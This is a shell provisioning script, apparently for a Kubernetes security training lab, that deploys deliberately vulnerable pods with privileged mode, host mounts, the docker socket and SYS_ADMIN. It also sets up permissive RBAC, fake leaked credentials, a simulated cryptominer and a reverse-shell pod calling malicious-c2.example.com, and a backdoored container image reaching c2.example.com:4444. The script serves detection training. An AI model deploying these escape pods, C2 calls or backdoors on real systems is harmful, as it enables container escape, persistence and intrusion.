# shellcheck shell=bash
          if [ "${DEBUG:-false}" = "true" ]; then set -x; fi
          set -euo pipefail

          MASTER_IP="@@CFG_IP@@"
          HARBOR_PASS=@@HARBOR_PASS_ESCAPED@@
          ATTACK_MARKER="/var/lib/devsecops_attack_vectors_installed"

          if [ -f "$ATTACK_MARKER" ] && [ "${FAST_BOOT}" = "true" ]; then
            echo "DevSecOps attack vectors already installed (FAST_BOOT=true)"
            exit 0
          fi

          export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
          export PATH=$PATH:/usr/local/bin

          echo "=========================================="
          echo "DEPLOYING DEVSECOPS ATTACK VECTORS"
          echo "=========================================="

          echo "Creating vulnerable namespaces (with privileged policy)..."
          cat <<EOF | python3 -c "import sys, textwrap; sys.stdout.write(textwrap.dedent(sys.stdin.read()))" | kubectl apply -f - || true
        ---
        apiVersion: v1
        kind: Namespace
        metadata:
          name: vulnerable
          labels:
            security-test: "true"
            pod-security.kubernetes.io/enforce: privileged
            pod-security.kubernetes.io/audit: privileged
            pod-security.kubernetes.io/warn: privileged
        ---
        apiVersion: v1
        kind: Namespace
        metadata:
          name: dev
          labels:
            security-test: "true"
            pod-security.kubernetes.io/enforce: privileged
            pod-security.kubernetes.io/audit: privileged
            pod-security.kubernetes.io/warn: privileged
        ---
        apiVersion: v1
        kind: Namespace
        metadata:
          name: insecure
          labels:
            security-test: "true"
            pod-security.kubernetes.io/enforce: privileged
            pod-security.kubernetes.io/audit: privileged
            pod-security.kubernetes.io/warn: privileged
EOF

          echo "Deploying privileged escape pod..."
          cat <<EOF | python3 -c "import sys, textwrap; sys.stdout.write(textwrap.dedent(sys.stdin.read()))" | kubectl apply -f - || true
        ---
        apiVersion: v1
        kind: Pod
        metadata:
          name: privileged-escape
          namespace: vulnerable
          labels:
            security-test: "true"
            app: escape
        spec:
          hostNetwork: true
          hostPID: true
          hostIPC: true
          containers:
          - name: escape
            image: ubuntu:22.04
            command: ["/bin/bash", "-c"]
            args:
            - |
              echo "=========================================="
              echo "PRIVILEGED ESCAPE POD"
              echo "=========================================="
              echo ""
              echo "ATTACK VECTORS:"
              echo "1. Host filesystem: cd /host && chroot . /bin/bash"
              echo "2. Process sniffing: ps auxf"
              echo "3. Network sniffing: tcpdump -i any"
              echo ""
              echo "FALCO DETECTION:"
              echo "- Container with privileged mode"
              echo "- Container with host mount"
              echo "- Read sensitive file untrusted"
              echo ""
              echo "=========================================="
              while true; do sleep 60; done
            securityContext:
              privileged: true
              runAsUser: 0
            volumeMounts:
            - name: host-root
              mountPath: /host
            - name: dev
              mountPath: /dev
            - name: proc
              mountPath: /host/proc
            - name: sys
              mountPath: /host/sys
            - name: cgroup
              mountPath: /host/sys/fs/cgroup
            - name: docker-socket
              mountPath: /host/var/run/docker.sock
          volumes:
          - name: host-root
            hostPath:
              path: /
              type: Directory
          - name: dev
            hostPath:
              path: /dev
          - name: proc
            hostPath:
              path: /proc
          - name: sys
            hostPath:
              path: /sys
          - name: cgroup
            hostPath:
              path: /sys/fs/cgroup
          - name: docker-socket
            hostPath:
              path: /var/run/docker.sock
EOF

          echo "Deploying docker breakout pod..."
          cat <<EOF | python3 -c "import sys, textwrap; sys.stdout.write(textwrap.dedent(sys.stdin.read()))" | kubectl apply -f - || true
        ---
        apiVersion: v1
        kind: Pod
        metadata:
          name: docker-breakout
          namespace: vulnerable
          labels:
            security-test: "true"
            app: breakout
        spec:
          containers:
          - name: docker-client
            image: docker:latest
            command: ["/bin/sh", "-c"]
            args:
            - |
              echo "=========================================="
              echo "DOCKER SOCKET BREAKOUT"
              echo "=========================================="
              echo ""
              echo "ATTACK VECTORS:"
              echo "1. List containers: docker ps"
              echo "2. Escape to host: docker run --privileged -v /:/host alpine chroot /host"
              echo "3. Deploy new containers: docker run -d nginx"
              echo ""
              echo "FALCO DETECTION:"
              echo "- Container with docker socket mount"
              echo "- Privileged container creation"
              echo ""
              echo "=========================================="
              while true; do sleep 60; done
            securityContext:
              privileged: true
            volumeMounts:
            - name: docker-socket
              mountPath: /var/run/docker.sock
          volumes:
          - name: docker-socket
            hostPath:
              path: /var/run/docker.sock
EOF

          echo "Deploying dangerous capabilities pod..."
          cat <<EOF | python3 -c "import sys, textwrap; sys.stdout.write(textwrap.dedent(sys.stdin.read()))" | kubectl apply -f - || true
        ---
        apiVersion: v1
        kind: Pod
        metadata:
          name: sys-admin-pod
          namespace: vulnerable
          labels:
            security-test: "true"
            app: cap
        spec:
          containers:
          - name: sys-admin
            image: ubuntu:22.04
            command: ["/bin/bash", "-c"]
            args:
            - |
              echo "=========================================="
              echo "DANGEROUS CAPABILITIES POD"
              echo "=========================================="
              echo ""
              echo "CAPABILITIES GRANTED:"
              echo "- SYS_ADMIN: Mount filesystems"
              echo "- SYS_PTRACE: Debug processes"
              echo "- DAC_READ_SEARCH: Bypass read permissions"
              echo ""
              echo "ATTACK VECTORS:"
              echo "1. Mount proc: mount -t proc none /proc"
              echo "2. Enter host namespace: nsenter -t 1 -m /bin/bash"
              echo "3. Ptrace processes: gdb -p 1"
              echo ""
              echo "FALCO DETECTION:"
              echo "- Container with SYS_ADMIN capability"
              echo "- Process with ptrace system call"
              echo ""
              echo "=========================================="
              while true; do sleep 60; done
            securityContext:
              capabilities:
                add:
                - SYS_ADMIN
                - SYS_PTRACE
                - DAC_READ_SEARCH
                - SYS_CHROOT
                - SYS_MODULE
EOF

          echo "Deploying RBAC escalation scenario..."
          cat <<EOF | python3 -c "import sys, textwrap; sys.stdout.write(textwrap.dedent(sys.stdin.read()))" | kubectl apply -f - || true
        ---
        apiVersion: v1
        kind: ServiceAccount
        metadata:
          name: dev-user
          namespace: dev
        ---
        apiVersion: rbac.authorization.k8s.io/v1
        kind: Role
        metadata:
          namespace: dev
          name: pod-exec-role
        rules:
        - apiGroups: [""]
          resources: ["pods/exec", "pods", "pods/log", "pods/status"]
          verbs: ["create", "get", "list", "watch", "delete"]
        - apiGroups: [""]
          resources: ["secrets", "configmaps", "serviceaccounts"]
          verbs: ["get", "list", "watch", "create", "delete"]
        - apiGroups: [""]
          resources: ["persistentvolumeclaims", "persistentvolumes"]
          verbs: ["get", "list", "create", "delete"]
        ---
        apiVersion: rbac.authorization.k8s.io/v1
        kind: RoleBinding
        metadata:
          namespace: dev
          name: dev-user-binding
        subjects:
        - kind: ServiceAccount
          name: dev-user
          namespace: dev
        roleRef:
          kind: Role
          name: pod-exec-role
          apiGroup: rbac.authorization.k8s.io
        ---
        apiVersion: apps/v1
        kind: Deployment
        metadata:
          name: nginx-dev
          namespace: dev
          labels:
            app: nginx-dev
        spec:
          replicas: 1
          selector:
            matchLabels:
              app: nginx-dev
          template:
            metadata:
              labels:
                app: nginx-dev
            spec:
              containers:
              - name: nginx
                image: nginx:alpine
                ports:
                - containerPort: 80
        ---
        apiVersion: v1
        kind: Service
        metadata:
          name: nginx-dev
          namespace: dev
        spec:
          selector:
            app: nginx-dev
          ports:
          - port: 80
            targetPort: 80
        ---
        apiVersion: v1
        kind: Secret
        metadata:
          name: db-credentials
          namespace: dev
        type: Opaque
        data:
          username: ZGJhZG1pbg==
          password: U3VwZXJTZWNyZXRQYXNzMTIzIQ==
          host: cG9zdGdyZXMtZGIuZXhhbXBsZS5jb20=
EOF

          echo "Deploying cryptominer cronjob..."
          cat <<EOF | python3 -c "import sys, textwrap; sys.stdout.write(textwrap.dedent(sys.stdin.read()))" | kubectl apply -f - || true
        ---
        apiVersion: batch/v1
        kind: CronJob
        metadata:
          name: crypto-miner
          namespace: insecure
          labels:
            security-test: "true"
            app: malicious
        spec:
          schedule: "*/5 * * * *"
          concurrencyPolicy: Forbid
          jobTemplate:
            spec:
              template:
                metadata:
                  labels:
                    app: crypto-miner
                spec:
                  containers:
                  - name: miner
                    image: alpine:3.20
                    command:
                    - /bin/sh
                    - -c
                    - |
                      echo "=========================================="
                      echo "CRYPTOMINER DETECTED"
                      echo "=========================================="
                      echo "SIMULATED MALICIOUS ACTIVITY:"
                      apk add --no-cache curl netcat-openbsd 2>/dev/null || true
                      curl -sS --connect-timeout 2 http://malicious-c2.example.com/register || true
                      curl -sS --connect-timeout 2 http://malicious-c2.example.com/payload.sh || true
                      dd if=/dev/zero of=/dev/null bs=1M count=50 2>/dev/null || true
                      echo "* * * * * /tmp/persist.sh" > /var/spool/cron/crontabs/root 2>/dev/null || true
                      echo "=========================================="
                      echo "FALCO DETECTION:"
                      echo "- Program run with netcat"
                      echo "- Program run with curl"
                      echo "- Shell command execution in container"
                      echo "=========================================="
                    resources:
                      limits:
                        cpu: "500m"
                        memory: "512Mi"
                  restartPolicy: OnFailure
        ---
        apiVersion: v1
        kind: Pod
        metadata:
          name: reverse-shell
          namespace: insecure
          labels:
            security-test: "true"
        spec:
          containers:
          - name: shell
            image: alpine:3.20
            command: ["/bin/sh", "-c"]
            args:
            - |
              echo "=========================================="
              echo "REVERSE SHELL POD"
              echo "=========================================="
              echo "ATTACK: Reverse shell to malicious C2"
              apk add --no-cache netcat-openbsd 2>/dev/null || true
              while true; do
                echo "Connecting to C2..."
                nc -zv malicious-c2.example.com 4444 2>&1 || true
                sleep 60
              done
EOF

          echo "Deploying hostpath exploitation pod..."
          cat <<EOF | python3 -c "import sys, textwrap; sys.stdout.write(textwrap.dedent(sys.stdin.read()))" | kubectl apply -f - || true
        ---
        apiVersion: v1
        kind: Pod
        metadata:
          name: hostpath-exploit
          namespace: vulnerable
          labels:
            security-test: "true"
        spec:
          containers:
          - name: exploit
            image: alpine:3.20
            command: ["/bin/sh", "-c"]
            args:
            - |
              echo "=========================================="
              echo "HOSTPATH EXPLOITATION POD"
              echo "=========================================="
              echo ""
              echo "ATTACK VECTORS:"
              echo "1. Read host secrets: cat /host/etc/kubernetes/pki/*"
              echo "2. Read logs: ls -la /host/var/log/"
              echo "3. Write to host: echo 'backdoor' > /host/tmp/backdoor"
              echo ""
              echo "FALCO DETECTION:"
              echo "- Read sensitive file untrusted"
              echo "- Write below root directory"
              echo ""
              echo "=========================================="
              while true; do sleep 60; done
            volumeMounts:
            - name: host-root
              mountPath: /host
            - name: etc-kubernetes
              mountPath: /host/etc/kubernetes
          volumes:
          - name: host-root
            hostPath:
              path: /
              type: Directory
          - name: etc-kubernetes
            hostPath:
              path: /etc/kubernetes
EOF

          echo "Creating leaked secrets file..."
          cat > /vagrant/terraform.tfstate <<'EOF'
        {
          "version": 4,
          "terraform_version": "1.9.8",
          "resources": [
            {
              "type": "aws_db_instance",
              "name": "production_db",
              "instances": [{
                "attributes": {
                  "password": "P@ssw0rd2026!SuperSecret",
                  "username": "dbadmin",
                  "endpoint": "prod-postgres-db.cabcdefg.us-east-1.rds.amazonaws.com"
                }
              }]
            },
            {
              "type": "aws_iam_access_key",
              "name": "developer_key",
              "instances": [{
                "attributes": {
                  "id": "AKIAIOSFODNN7EXAMPLE",
                  "secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
                }
              }]
            }
          ]
        }
EOF

          cat > /vagrant/.env.production <<'EOF'
        # Production Environment Variables - LEAKED!
        DB_PASSWORD=P@ssw0rd2026!SuperSecret
        AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
        AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
        STRIPE_SECRET_KEY=sk_lab_fake_0000000000000000
        JWT_SECRET=super-secret-jwt-key-1234567890
EOF

          echo "Building and pushing backdoored image to Harbor..."
          for i in $(seq 1 30); do
            if curl -sk --max-time 5 "https://${MASTER_IP}:30001/v2/" >/dev/null 2>&1; then
              echo "Harbor is reachable"
              break
            fi
            echo "Waiting for Harbor... ($i/30)"
            sleep 10
          done

          cat > /tmp/Dockerfile.backdoor <<'EOF'
        FROM alpine:3.20
        RUN apk add --no-cache bash curl netcat-openbsd
        WORKDIR /app
        RUN cat > /app/app.sh <<'EOS'
        #!/bin/bash
        echo "[$(date)] API Server Starting..."
        while true; do
            echo "[$(date)] Health check: OK"
            sleep 30
        done
EOS
        RUN chmod +x /app/app.sh
        RUN cat > /app/backdoor.sh <<'EOS'
        #!/bin/bash
        while true; do
            if [ "${BACKDOOR_ENABLED:-false}" = "true" ]; then
                echo "[BACKDOOR] Activated - Connecting to ${BACKDOOR_HOST:-c2.example.com}:${BACKDOOR_PORT:-4444}"
                nc -zv ${BACKDOOR_HOST:-c2.example.com} ${BACKDOOR_PORT:-4444} 2>&1 || true
            fi
            sleep 60
        done
EOS
        RUN chmod +x /app/backdoor.sh
        RUN cat > /app/start.sh <<'EOS'
        #!/bin/bash
        nohup /app/app.sh > /app/app.log 2>&1 &
        nohup /app/backdoor.sh > /app/backdoor.log 2>&1 &
        tail -f /app/*.log
EOS
        RUN chmod +x /app/start.sh
        CMD ["/app/start.sh"]
EOF

          if command -v docker >/dev/null 2>&1; then
            echo "${HARBOR_PASS}" | docker login "${MASTER_IP}:30001" -u admin --password-stdin 2>/dev/null || true
            docker build -f /tmp/Dockerfile.backdoor -t "${MASTER_IP}:30001/airgap/backdoor-api:v1" /tmp/ 2>/dev/null || true
            docker push "${MASTER_IP}:30001/airgap/backdoor-api:v1" 2>/dev/null || true
            echo "Backdoored image pushed to Harbor"
          else
            echo "Docker not available - skipping backdoored image build"
          fi

          echo ""
          echo "=========================================="
          echo "DEVSECOPS ATTACK VECTORS DEPLOYED"
          echo "=========================================="
          echo ""
          echo "AVAILABLE ATTACK SCENARIOS:"
          echo ""
          echo "1. Container Escape:"
          echo "   kubectl exec -it privileged-escape -n vulnerable -- /bin/bash"
          echo ""
          echo "2. Docker Breakout:"
          echo "   kubectl exec -it docker-breakout -n vulnerable -- /bin/sh"
          echo ""
          echo "3. RBAC Escalation:"
          echo "   kubectl --as=system:serviceaccount:dev:dev-user get pods -n dev"
          echo ""
          echo "4. Cryptominer Detection:"
          echo "   kubectl get cronjobs -n insecure"
          echo ""
          echo "5. HostPath Exploitation:"
          echo "   kubectl exec -it hostpath-exploit -n vulnerable -- /bin/sh"
          echo ""
          echo "6. Supply Chain Attack:"
          echo "   kubectl run backdoor-api --image=${MASTER_IP}:30001/airgap/backdoor-api:v1"
          echo ""
          echo "LEAKED SECRETS:"
          echo "   cat /vagrant/terraform.tfstate"
          echo "   cat /vagrant/.env.production"
          echo ""
          echo "MONITORING:"
          echo "   Falco: kubectl logs -f -n falco deployment/falco"
          echo "   Kyverno: kubectl get clusterpolicies"
          echo ""
          echo "=========================================="

          touch "$ATTACK_MARKER"
          echo "DevSecOps attack vectors deployment complete!"
